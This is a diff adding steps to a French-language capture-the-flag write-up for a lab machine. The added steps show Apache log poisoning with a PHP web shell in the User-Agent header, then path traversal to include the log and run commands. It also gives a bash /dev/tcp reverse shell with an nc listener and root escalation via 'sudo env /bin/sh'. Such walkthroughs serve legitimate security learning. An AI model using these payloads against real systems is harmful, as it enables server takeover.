@@ -65,3 +65,44 @@ To get the first flag put this in url :
 
 <img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/2e4974e3-a7bd-4154-a497-ba83d38df3f1" />
 
+Pour faire une RCE : 
+sur le terminal : 
+```
+curl -s "http://10.130.149.180/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
+```
+
+taper cette url ensuite : 
+```
+http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=id
+```
+
+ensuite sur un terminal se mettre sur écoute :
+```
+nc -lvnp 4444
+```
+
+ensuite taper cette url :
+```
+http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TON_IP/4444+0>%261' 
+```
+
+
+Bravo on a le control du serveur !!
+
+
+---
+Pour devenir root :
+
+```
+sudo -l 
+```
+<img width="682" height="132" alt="image" src="https://github.com/user-attachments/assets/71378776-371e-4583-8e13-bd2739336acd" />
+
+GO GTFOBINS :
+<img width="935" height="541" alt="image" src="https://github.com/user-attachments/assets/24ed595a-0030-4de5-be23-79c5603e6784" />
+
+donc :
+```
+sudo env /bin/sh
+```
+gg t'es root
